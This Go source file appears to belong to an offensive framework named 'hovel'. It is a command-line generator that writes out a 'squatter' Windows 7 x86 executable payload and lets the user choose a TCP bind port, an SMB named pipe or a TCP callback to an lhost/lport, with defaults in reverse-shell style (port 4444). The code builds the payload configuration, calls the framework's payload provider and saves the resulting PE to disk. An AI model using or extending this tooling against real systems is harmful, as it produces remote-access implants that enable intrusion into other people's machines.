//go:build hovel_squatter_generate

package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"os"

	"github.com/vibepwners/hovel/sdk/go/hovel"
)

func main() {
	os.Exit(runGenerateCommand(os.Args[1:], os.Stdout, os.Stderr))
}

func runGenerateCommand(args []string, stdout, stderr io.Writer) int {
	flags := flag.NewFlagSet("squatter-generate", flag.ContinueOnError)
	flags.SetOutput(stderr)
	transport := flags.String("transport", tcpBind, "payload transport: tcp-bind, smb-named-pipe, or tcp-callback")
	outPath := flags.String("out", "", "path to write the patched PE")
	pipe := flags.String("pipe", `\\.\pipe\squatter`, "named pipe for smb-named-pipe transport")
	bindPort := flags.String("bind-port", "9100", "TCP bind port")
	lhost := flags.String("lhost", "127.0.0.1", "TCP callback host")
	lport := flags.String("lport", "4444", "TCP callback port")
	if err := flags.Parse(args); err != nil {
		return 2
	}
	if *outPath == "" {
		fmt.Fprintln(stderr, "generate requires --out")
		return 2
	}
	config := map[string]string{
		"payload.transport": canonicalTransport(*transport),
		"payload.pipe":      *pipe,
		"payload.bind_port": *bindPort,
		"payload.lhost":     *lhost,
		"payload.lport":     *lport,
	}
	artifact, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		RunID:     "manual-generate",
		PayloadID: "squatter/windows/x86/windows-7/" + config["payload.transport"] + "/pe-exe",
		Format:    formatPEEXE,
		Config:    config,
	})
	if err != nil {
		fmt.Fprintf(stderr, "generate: %v\n", err)
		return 1
	}
	body, err := base64.StdEncoding.DecodeString(artifact.Primary.Bytes)
	if err != nil {
		fmt.Fprintf(stderr, "decode generated payload: %v\n", err)
		return 1
	}
	if err := os.WriteFile(*outPath, body, 0600); err != nil {
		fmt.Fprintf(stderr, "write %s: %v\n", *outPath, err)
		return 1
	}
	fmt.Fprintf(stdout, "wrote %s (%d bytes, transport=%s)\n", *outPath, len(body), config["payload.transport"])
	return 0
}
